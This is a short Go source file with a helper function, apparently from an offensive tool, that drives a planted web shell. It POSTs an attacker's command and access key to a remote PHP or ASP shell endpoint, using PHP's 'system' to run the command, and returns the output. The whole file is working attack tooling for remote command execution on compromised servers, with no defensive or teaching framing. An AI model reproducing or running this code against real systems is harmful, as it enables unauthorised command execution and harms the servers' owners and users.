package helper

import (
	"bytes"
	"errors"
	"io/ioutil"
	"net/http"
	"net/url"
	"time"

	"github.com/asaskevich/govalidator"
)

// Payload ...
func (s *Service) Payload(endpoint string, key string, command string, shellType string, timeOut time.Duration) (string, error) {
	client := http.Client{
		Timeout: time.Duration(timeOut * time.Second),
	}

	params := url.Values{}

	if shellType == "php" {
		params.Set("0", "system")
		params.Set("1", command)
		params.Set("2", key)
	}

	if shellType == "asp" {
		params.Set("0", command)
		params.Set("1", key)
	}

	payload := bytes.NewBufferString(params.Encode())

	req, err := http.NewRequest("POST", endpoint, payload)
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}

	defer resp.Body.Close()

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if govalidator.IsNull(string(respBody)) {
		return "", errors.New("empty response")
	}

	return string(respBody), nil
}
